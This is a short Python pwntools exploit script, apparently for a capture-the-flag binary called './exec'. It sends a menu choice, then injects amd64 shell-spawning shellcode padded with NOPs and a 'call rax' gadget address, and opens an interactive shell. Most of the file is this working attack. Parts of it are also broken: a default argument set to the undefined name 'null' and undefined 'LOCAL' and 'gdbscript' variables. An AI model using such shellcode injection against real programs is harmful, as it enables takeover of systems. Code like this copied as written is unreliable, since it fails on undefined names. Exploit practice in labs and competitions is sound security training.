from pwn import *
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/master/tools/gdb/pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """

            """
            gdb.attach(io, gdbscript=cmd)
exe = './exec'
elf = context.binary = ELF(exe)

io = process(exe)

io.sendline(b'2')
p = asm(shellcraft.sh(), arch='amd64')
p = p.ljust(120, asm('nop'))
p += p64(0x0000000000401010) # call rax
io.sendline(p)
io.interactive()